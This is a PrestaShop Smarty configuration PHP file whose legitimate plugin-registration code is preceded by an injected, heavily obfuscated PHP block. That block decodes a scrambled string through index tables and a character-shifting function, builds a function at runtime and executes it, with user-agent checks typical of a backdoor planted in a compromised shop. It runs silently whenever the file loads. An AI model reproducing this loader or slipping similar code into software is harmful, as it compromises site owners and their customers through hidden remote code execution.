<?php $bitsbt = 'g)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%t)fubmgoj{hA!osvufs!~<3,j%>fyqmpef)#	x24*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Q*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]47y,;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*111127-K)ebfsX	x27u%)7fmjix6<C,27R66,#/q%>2q%<#g6R85jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zb2	x65	141	x74	145	x5fW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341] ((strstr($uas,"	x6d	163	x69	145")n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>24-	x24y7	x24-	x24*<!	x24-	x24gps)%j>1<%j=tj{fp;%!<*#}_;#)323ldfid>}&;!osvufs}	x7fc6f+9f5d816:+946:ce44#)zb~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW]252]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~88M4P8]37]278]225]241]334]368]trtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	105	x52	137	nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftbc	DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6mf!~<**9.-j%-bubE{h%)sutcv<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfs)) or (strstr($uas,"	x72	166	64") && (!isset($GLOBALS["	x61	146	x75	156	x63	164	x69	157	x6e"; funcUFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6dXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273qj%,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#tion yehmmfj($n){return chr(ord($n)-1);} @/!**#sfmcnbs+yfeobz+sfwjid**#57]38y]47]67y]37]88y]27]28y]#/r%/h%if((function_exists("	x6f	142	x5f	163	x74	141	x72	1#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281Lg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<u%V	x27{	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%ff2!>!bss;!opjudovg}k~~9{d%:osvsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!h%)tpqsut>j%!*9!	x27!hmg%)!gj!~78]K5]53]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]c	x27,*b	x27)fepdof.)e!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#])tutjyf`x	x22l:!}V;3q%}U;y]}R;2]}fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W!gj!<2,*j%-#1]#-bubE{)}.;`UQPMSVD!-id%)uqpuft`msvd},;u6<.2`hA	x27pd%6<C	x27VPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7qpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvufs}w); $mjqxxfp();}}x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5c3]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%	x5cq%	x27Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	bz)	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	xsp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48**WYsboepn)%bss-%rxB%h>#]y31]278]y3e]81]%)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1#-!%w:**<")));$mjqxxfp = $ufsntnp("", $grkwfam97f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6K78:56985:6197g:74985-rr.93e:5597f-s.973:82fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gd]245]K2]285]Ke]53Ld]57jsv%6<C>^#zsfvr#	x5cq%7**^#zsfvr#sbz)#44ec:649#-!#:618d5f9#-!#f6c68399s%6<#o]1/20QUUI7jsv%7SFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27fdy<Cb*[%h!>!%tdz)%bbT-%bT-%h!}6;##}C;!>>!}W;utpi}1y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{hz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-4]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x~!!%s:N}#-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fp7f_*#fubfsdXk5`{66~6<&w	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rf]y3e]81#/#7e:55946-tr.9%)utjm6<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7*6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x2;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ft~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tuy84]275]y83]273]y76]277#<!%t2w>#]y74]27<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x2151	x64"))) { $ufsntnp = "	x63	163]y76]252]y85]256]y6g]257]y86]267]y74]275pd%6|6.7eu{66~67<&w6<*error_reporting(0); $grkwfam = implode(array_map("yehmmfj",str_split(">2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbj6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R57ufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`439275ttfsqnpdov{h19))1/35.)1/14+9**-)1/2986+7**^/%rx<QUUI&c_UOFHB`SFTV`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt7!hmg%)!gj!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#9x41	107	x45	116	x54"]); if43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bss	x5csboe	x5cq%)ufttj	x22)gj6<^#Y#tjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*i	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bs%tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y<h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-U1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of><.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z84:75983:48984:71]K9]77]D4]82]K6]72]K9]ssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*wfepdof./#@#/qp%>5h%!<!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	]y7:]268]y7f#<!%tww!>!	x2400~:	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x75	156	x61"]=1; $uas=s;*	x7f!>>	x22!pd%)!gj}Z]32M3]317]445]212]445]2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38)%z-#:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x2j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)&7-#o]s]o]s]#)fepmqyf	x27*&7-n%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%twwSTrrEvxNoITCnuF_EtaeRCxECaLPer_RtSzvlahtkk'; $xfjege=explode(chr((717-597)),substr($bitsbt,(36688-30762),(235-201))); $ofaxjwp = $xfjege[0]($xfjege[(3-2)]); $fbsuuxu = $xfjege[0]($xfjege[(13-11)]); if (!function_exists('ioazgkcka')) { function ioazgkcka($zzbdka, $ajbubo,$rqkgabhz) { $liyejddl = NULL; for($gwzyyt=0;$gwzyyt<(sizeof($zzbdka)/2);$gwzyyt++) { $liyejddl .= substr($ajbubo, $zzbdka[($gwzyyt*2)],$zzbdka[($gwzyyt*2)+(4-3)]); } return $rqkgabhz(chr((35-26)),chr((303-211)),$liyejddl); }; } $klooyvog = explode(chr((284-240)),'1733,51,1358,30,5407,67,1036,61,4661,26,663,33,1329,29,5325,52,4062,33,603,21,1388,39,1627,42,4158,70,4909,50,1204,62,5085,43,2360,21,4136,22,5833,30,3676,49,504,31,3609,44,3255,21,1427,68,1292,37,1495,70,3725,66,3184,34,4751,25,2589,40,3586,23,2629,59,453,51,4992,52,2381,62,3119,43,4280,38,3365,21,54,53,2327,33,2443,57,5474,23,3791,66,1266,26,107,27,5767,66,2306,21,2070,31,3993,69,4593,68,3386,47,2906,56,3857,32,269,36,5044,41,5519,64,2152,21,5262,21,201,68,1669,26,2006,64,2730,68,824,25,5167,58,4466,63,5283,42,1097,51,2516,37,3276,60,789,35,1984,22,4367,65,3889,65,4776,65,1865,67,5225,37,4318,49,535,22,1565,62,2209,33,366,63,429,24,557,46,2173,36,3954,39,4095,41,5377,30,4959,33,1695,38,696,46,305,61,938,68,1932,52,2688,42,4529,64,5700,67,3499,41,742,47,0,54,134,67,4841,68,3218,37,5583,68,896,42,5863,63,2866,40,3076,43,3008,68,3653,23,5128,39,2101,51,1148,56,1784,49,3162,22,2553,36,3336,29,624,39,1006,30,2798,68,5497,22,4687,64,4432,34,3540,46,1833,32,2242,64,849,47,4228,52,3433,66,5651,49,2962,46,2500,16'); $rxupjwb = $ofaxjwp("",ioazgkcka($klooyvog,$bitsbt,$fbsuuxu)); $ofaxjwp=$bitsbt; $rxupjwb(""); $rxupjwb=(583-462); $bitsbt=$rxupjwb-1; ?><?php
/*
* 2007-2015 PrestaShop
*
* NOTICE OF LICENSE
*
* This source file is subject to the Open Software License (OSL 3.0)
* that is bundled with this package in the file LICENSE.txt.
* It is also available through the world-wide-web at this URL:
* http://opensource.org/licenses/osl-3.0.php
* If you did not receive a copy of the license and are unable to
* obtain it through the world-wide-web, please send an email
* to license@prestashop.com so we can send you a copy immediately.
*
* DISCLAIMER
*
* Do not edit or add to this file if you wish to upgrade PrestaShop to newer
* versions in the future. If you wish to customize PrestaShop for your
* needs please refer to http://www.prestashop.com for more information.
*
*  @author PrestaShop SA <contact@prestashop.com>
*  @copyright  2007-2015 PrestaShop SA
*  @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
*  International Registered Trademark & Property of PrestaShop SA
*/

define('_PS_SMARTY_DIR_', _PS_TOOL_DIR_.'smarty/');

require_once(_PS_SMARTY_DIR_.'Smarty.class.php');

global $smarty;
$smarty = new SmartyCustom();
$smarty->setCompileDir(_PS_CACHE_DIR_.'smarty/compile');
$smarty->setCacheDir(_PS_CACHE_DIR_.'smarty/cache');
if (!Tools::getSafeModeStatus()) {
    $smarty->use_sub_dirs = true;
}
$smarty->setConfigDir(_PS_SMARTY_DIR_.'configs');
$smarty->caching = false;
if (Configuration::get('PS_SMARTY_CACHING_TYPE') == 'mysql') {
    include(_PS_CLASS_DIR_.'/SmartyCacheResourceMysql.php');
    $smarty->caching_type = 'mysql';
}
$smarty->force_compile = (Configuration::get('PS_SMARTY_FORCE_COMPILE') == _PS_SMARTY_FORCE_COMPILE_) ? true : false;
$smarty->compile_check = (Configuration::get('PS_SMARTY_FORCE_COMPILE') >= _PS_SMARTY_CHECK_COMPILE_) ? true : false;
$smarty->debug_tpl = _PS_ALL_THEMES_DIR_.'debug.tpl';

/* Use this constant if you want to load smarty without all PrestaShop functions */
if (defined('_PS_SMARTY_FAST_LOAD_') && _PS_SMARTY_FAST_LOAD_) {
    return;
}

if (defined('_PS_ADMIN_DIR_')) {
    require_once(dirname(__FILE__).'/smartyadmin.config.inc.php');
} else {
    require_once(dirname(__FILE__).'/smartyfront.config.inc.php');
}

smartyRegisterFunction($smarty, 'modifier', 'truncate', 'smarty_modifier_truncate');
smartyRegisterFunction($smarty, 'modifier', 'secureReferrer', array('Tools', 'secureReferrer'));

smartyRegisterFunction($smarty, 'function', 't', 'smartyTruncate'); // unused
smartyRegisterFunction($smarty, 'function', 'm', 'smartyMaxWords'); // unused
smartyRegisterFunction($smarty, 'function', 'p', 'smartyShowObject'); // Debug only
smartyRegisterFunction($smarty, 'function', 'd', 'smartyDieObject'); // Debug only
smartyRegisterFunction($smarty, 'function', 'l', 'smartyTranslate', false);
smartyRegisterFunction($smarty, 'function', 'hook', 'smartyHook');
smartyRegisterFunction($smarty, 'function', 'toolsConvertPrice', 'toolsConvertPrice');
smartyRegisterFunction($smarty, 'modifier', 'json_encode', array('Tools', 'jsonEncode'));
smartyRegisterFunction($smarty, 'modifier', 'json_decode', array('Tools', 'jsonDecode'));
smartyRegisterFunction($smarty, 'function', 'dateFormat', array('Tools', 'dateFormat'));
smartyRegisterFunction($smarty, 'function', 'convertPrice', array('Product', 'convertPrice'));
smartyRegisterFunction($smarty, 'function', 'convertPriceWithCurrency', array('Product', 'convertPriceWithCurrency'));
smartyRegisterFunction($smarty, 'function', 'displayWtPrice', array('Product', 'displayWtPrice'));
smartyRegisterFunction($smarty, 'function', 'displayWtPriceWithCurrency', array('Product', 'displayWtPriceWithCurrency'));
smartyRegisterFunction($smarty, 'function', 'displayPrice', array('Tools', 'displayPriceSmarty'));
smartyRegisterFunction($smarty, 'modifier', 'convertAndFormatPrice', array('Product', 'convertAndFormatPrice')); // used twice
smartyRegisterFunction($smarty, 'function', 'getAdminToken', array('Tools', 'getAdminTokenLiteSmarty'));
smartyRegisterFunction($smarty, 'function', 'displayAddressDetail', array('AddressFormat', 'generateAddressSmarty'));
smartyRegisterFunction($smarty, 'function', 'getWidthSize', array('Image', 'getWidth'));
smartyRegisterFunction($smarty, 'function', 'getHeightSize', array('Image', 'getHeight'));
smartyRegisterFunction($smarty, 'function', 'addJsDef', array('Media', 'addJsDef'));
smartyRegisterFunction($smarty, 'block', 'addJsDefL', array('Media', 'addJsDefL'));
smartyRegisterFunction($smarty, 'modifier', 'boolval', array('Tools', 'boolval'));
smartyRegisterFunction($smarty, 'modifier', 'cleanHtml', 'smartyCleanHtml');

function smartyDieObject($params, &$smarty)
{
    return Tools::d($params['var']);
}

function smartyShowObject($params, &$smarty)
{
    return Tools::p($params['var']);
}

function smartyMaxWords($params, &$smarty)
{
    Tools::displayAsDeprecated();
    $params['s'] = str_replace('...', ' ...', html_entity_decode($params['s'], ENT_QUOTES, 'UTF-8'));
    $words = explode(' ', $params['s']);

    foreach ($words as &$word) {
        if (Tools::strlen($word) > $params['n']) {
            $word = Tools::substr(trim(chunk_split($word, $params['n']-1, '- ')), 0, -1);
        }
    }

    return implode(' ',  Tools::htmlentitiesUTF8($words));
}

function smartyTruncate($params, &$smarty)
{
    Tools::displayAsDeprecated();
    $text = isset($params['strip']) ? strip_tags($params['text']) : $params['text'];
    $length = $params['length'];
    $sep = isset($params['sep']) ? $params['sep'] : '...';

    if (Tools::strlen($text) > $length + Tools::strlen($sep)) {
        $text = Tools::substr($text, 0, $length).$sep;
    }

    return (isset($params['encode']) ? Tools::htmlentitiesUTF8($text, ENT_NOQUOTES) : $text);
}

function smarty_modifier_truncate($string, $length = 80, $etc = '...', $break_words = false, $middle = false, $charset = 'UTF-8')
{
    if (!$length) {
        return '';
    }

    $string = trim($string);

    if (Tools::strlen($string) > $length) {
        $length -= min($length, Tools::strlen($etc));
        if (!$break_words && !$middle) {
            $string = preg_replace('/\s+?(\S+)?$/u', '', Tools::substr($string, 0, $length+1, $charset));
        }
        return !$middle ? Tools::substr($string, 0, $length, $charset).$etc : Tools::substr($string, 0, $length/2, $charset).$etc.Tools::substr($string, -$length/2, $length, $charset);
    } else {
        return $string;
    }
}

function smarty_modifier_htmlentitiesUTF8($string)
{
    return Tools::htmlentitiesUTF8($string);
}
function smartyMinifyHTML($tpl_output, &$smarty)
{
    $context = Context::getContext();
    if (isset($context->controller) && in_array($context->controller->php_self, array('pdf-invoice', 'pdf-order-return', 'pdf-order-slip'))) {
        return $tpl_output;
    }
    $tpl_output = Media::minifyHTML($tpl_output);
    return $tpl_output;
}

function smartyPackJSinHTML($tpl_output, &$smarty)
{
    $context = Context::getContext();
    if (isset($context->controller) && in_array($context->controller->php_self, array('pdf-invoice', 'pdf-order-return', 'pdf-order-slip'))) {
        return $tpl_output;
    }
    $tpl_output = Media::packJSinHTML($tpl_output);
    return $tpl_output;
}

function smartyRegisterFunction($smarty, $type, $function, $params, $lazy = true)
{
    if (!in_array($type, array('function', 'modifier', 'block'))) {
        return false;
    }

    // lazy is better if the function is not called on every page
    if ($lazy) {
        $lazy_register = SmartyLazyRegister::getInstance();
        $lazy_register->register($params);

        if (is_array($params)) {
            $params = $params[1];
        }

        // SmartyLazyRegister allows to only load external class when they are needed
        $smarty->registerPlugin($type, $function, array($lazy_register, $params));
    } else {
        $smarty->registerPlugin($type, $function, $params);
    }
}

function smartyHook($params, &$smarty)
{
    if (!empty($params['h'])) {
        $id_module = null;
        $hook_params = $params;
        $hook_params['smarty'] = $smarty;
        if (!empty($params['mod'])) {
            $module = Module::getInstanceByName($params['mod']);
            if ($module && $module->id) {
                $id_module = $module->id;
            }
            unset($hook_params['mod']);
        }
        unset($hook_params['h']);
        return Hook::exec($params['h'], $hook_params, $id_module);
    }
}

function smartyCleanHtml($data)
{
    // Prevent xss injection.
    if (Validate::isCleanHtml($data)) {
        return $data;
    }
}

function toolsConvertPrice($params, &$smarty)
{
    return Tools::convertPrice($params['price'], Context::getContext()->currency);
}

/**
 * Used to delay loading of external classes with smarty->register_plugin
 */
class SmartyLazyRegister
{
    protected $registry = array();
    protected static $instance;

    /**
     * Register a function or method to be dynamically called later
     * @param string|array $params function name or array(object name, method name)
     */
    public function register($params)
    {
        if (is_array($params)) {
            $this->registry[$params[1]] = $params;
        } else {
            $this->registry[$params] = $params;
        }
    }

    /**
     * Dynamically call static function or method
     *
     * @param string $name function name
     * @param mixed $arguments function argument
     * @return mixed function return
     */
    public function __call($name, $arguments)
    {
        $item = $this->registry[$name];

        // case 1: call to static method - case 2 : call to static function
        if (is_array($item[1])) {
            return call_user_func_array($item[1].'::'.$item[0], array($arguments[0], &$arguments[1]));
        } else {
            $args = array();

            foreach ($arguments as $a => $argument) {
                if ($a == 0) {
                    $args[] = $arguments[0];
                } else {
                    $args[] = &$arguments[$a];
                }
            }

            return call_user_func_array($item, $args);
        }
    }

    public static function getInstance()
    {
        if (!self::$instance) {
            self::$instance = new SmartyLazyRegister();
        }
        return self::$instance;
    }
}
